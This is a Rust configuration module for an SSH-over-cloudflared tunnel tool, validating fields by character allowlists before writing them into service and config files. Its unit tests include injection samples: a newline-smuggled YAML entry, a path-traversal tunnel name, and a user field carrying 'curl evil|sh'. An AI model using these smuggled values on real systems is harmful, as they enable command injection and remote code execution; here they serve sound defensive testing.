use anyhow::{Context, Result, bail};
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::PathBuf;

pub fn home() -> PathBuf {
    std::env::var_os("HOME")
        .map(PathBuf::from)
        .unwrap_or_else(|| PathBuf::from("."))
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Config {
    pub tunnel: String,
    #[serde(default)]
    pub tunnel_id: String,
    pub hostname: String,
    pub user: String,
    #[serde(default = "default_target")]
    pub local_target: String,
    pub cloudflared: PathBuf,
    #[serde(default)]
    pub identity_file: Option<PathBuf>,
    #[serde(default)]
    pub ssh_alias: Option<String>,
}

fn default_target() -> String {
    "127.0.0.1:22".to_string()
}

impl Config {
    pub fn dir() -> PathBuf {
        home().join(".config").join("ssh-tunnel")
    }

    pub fn path() -> PathBuf {
        Self::dir().join("config.toml")
    }

    pub fn exists() -> bool {
        Self::path().exists()
    }

    pub fn load() -> Result<Self> {
        let p = Self::path();
        let text = fs::read_to_string(&p).with_context(|| format!("reading {}", p.display()))?;
        let cfg: Self =
            toml::from_str(&text).with_context(|| format!("parsing {}", p.display()))?;
        cfg.validate()?;
        Ok(cfg)
    }

    /// Reject values that could escape their field when written into the
    /// systemd unit, the cloudflared YAML, `ssh_config`, or the Termux script.
    pub fn validate(&self) -> Result<()> {
        for (name, value) in [
            ("tunnel", &self.tunnel),
            ("hostname", &self.hostname),
            ("user", &self.user),
            ("local_target", &self.local_target),
        ] {
            if value.trim().is_empty() {
                bail!("{name} must not be empty");
            }
        }
        check(&self.tunnel, "tunnel", |c| {
            c.is_ascii_alphanumeric() || c == '-' || c == '_'
        })?;
        if self.tunnel.len() > 64 {
            bail!("tunnel name is too long");
        }
        check(&self.tunnel_id, "tunnel_id", |c| {
            c.is_ascii_hexdigit() || c == '-'
        })?;
        check(&self.hostname, "hostname", |c| {
            c.is_ascii_alphanumeric() || c == '.' || c == '-'
        })?;
        check(&self.user, "user", |c| {
            c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == '_'
        })?;
        check(&self.local_target, "local_target", |c| {
            c.is_ascii_alphanumeric() || matches!(c, '.' | ':' | '-' | '_' | '[' | ']')
        })?;
        if let Some(alias) = &self.ssh_alias {
            check(alias, "ssh_alias", |c| {
                c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == '_'
            })?;
        }
        Ok(())
    }

    pub fn load_required() -> Result<Self> {
        if !Self::exists() {
            bail!(
                "no config at {}. Run `ssh-tunnel init` first.",
                Self::path().display()
            );
        }
        Self::load()
    }

    pub fn save(&self) -> Result<()> {
        self.validate()?;
        fs::create_dir_all(Self::dir())?;
        set_mode(&Self::dir(), 0o700)?;
        let text = toml::to_string_pretty(self)?;
        let p = Self::path();
        fs::write(&p, text)?;
        set_mode(&p, 0o600)?;
        Ok(())
    }

    pub fn alias(&self) -> String {
        self.ssh_alias
            .clone()
            .unwrap_or_else(|| self.tunnel.clone())
    }

    pub fn unit_name(&self) -> String {
        format!("cloudflared-{}.service", self.tunnel)
    }

    pub fn unit_path(&self) -> PathBuf {
        home().join(".config/systemd/user").join(self.unit_name())
    }

    pub fn cf_config(&self) -> PathBuf {
        home().join(".cloudflared").join("config.yml")
    }

    pub fn creds(&self) -> PathBuf {
        home()
            .join(".cloudflared")
            .join(format!("{}.json", self.tunnel_id))
    }

    pub fn cert(&self) -> PathBuf {
        home().join(".cloudflared").join("cert.pem")
    }

    pub fn authorized_keys(&self) -> PathBuf {
        home().join(".ssh").join("authorized_keys")
    }
}

/// Every character must be in an explicit allowlist. Empty values are allowed
/// where they are meaningful (a tunnel id before `setup` runs).
fn check(value: &str, name: &str, allowed: impl Fn(char) -> bool) -> Result<()> {
    if let Some(bad) = value.chars().find(|c| !allowed(*c)) {
        bail!("{name} contains a disallowed character ({bad:?}); got {value:?}");
    }
    Ok(())
}

pub fn set_mode(path: &std::path::Path, mode: u32) -> Result<()> {
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(path, fs::Permissions::from_mode(mode))?;
    }
    #[cfg(not(unix))]
    {
        let _ = (path, mode);
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::Config;
    use std::path::PathBuf;

    fn base() -> Config {
        Config {
            tunnel: "g15".into(),
            tunnel_id: "bb19332f-1700-4b4f-b803-5242186bc387".into(),
            hostname: "ssh.example.com".into(),
            user: "alice".into(),
            local_target: "127.0.0.1:22".into(),
            cloudflared: PathBuf::from("/usr/bin/cloudflared"),
            identity_file: None,
            ssh_alias: None,
        }
    }

    #[test]
    fn accepts_a_normal_config() {
        assert!(base().validate().is_ok());
    }

    #[test]
    fn accepts_ipv6_local_target() {
        let mut cfg = base();
        cfg.local_target = "[::1]:22".into();
        assert!(cfg.validate().is_ok());
    }

    #[test]
    fn rejects_newline_in_hostname() {
        let mut cfg = base();
        cfg.hostname = "ssh.example.com\n  - service: http://evil".into();
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn rejects_tunnel_path_traversal() {
        let mut cfg = base();
        cfg.tunnel = "../../../tmp/pwned".into();
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn rejects_shell_metacharacters_in_user() {
        let mut cfg = base();
        cfg.user = "alice;curl evil|sh".into();
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn rejects_empty_hostname() {
        let mut cfg = base();
        cfg.hostname = String::new();
        assert!(cfg.validate().is_err());
    }
}
